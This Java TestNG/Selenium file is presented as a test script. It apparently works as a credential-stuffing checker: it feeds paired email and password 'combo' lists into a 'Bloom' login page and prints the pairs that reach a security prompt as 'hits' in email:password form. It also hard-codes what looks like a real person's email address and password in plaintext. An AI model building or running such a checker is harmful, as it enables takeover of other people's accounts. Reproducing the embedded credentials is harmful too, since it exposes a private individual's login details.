package test_scripts;

import org.testng.annotations.Test;
import page_objects.LandingPage;

import java.util.ArrayList;

public class newStuff extends DriverWrapper {

    @Test

    public void testBloom() throws InterruptedException {

        LandingPage landingPage = new LandingPage();
        ArrayList<String> comboEmail = new ArrayList<>();
        ArrayList<String> comboPass = new ArrayList<>();
        comboEmail.add("diwanmahi@gmail.com");
        comboPass.add("Diwan123@@");
        ArrayList<String> hits = new ArrayList<>();
        int numberOfHits = 0;

        int emailSize = comboEmail.size();

        for(int index = 0; index<emailSize; index++){
            landingPage.enterBloomEmail(comboEmail.get(index));
            landingPage.enterBloomPass(comboPass.get(index));
            landingPage.clickBloom();
            Thread.sleep(5000);
            if(landingPage.isBloomSecurity()){
                //System.out.println("Security alert");
                String hit = comboEmail.get(index)+ ":" + comboPass.get(index);
                hits.add(hit);
                numberOfHits++;
            }
        }

        for(String success:hits){
            System.out.println(success);
        }
        System.out.println("Total hits = " + numberOfHits);


    }


}
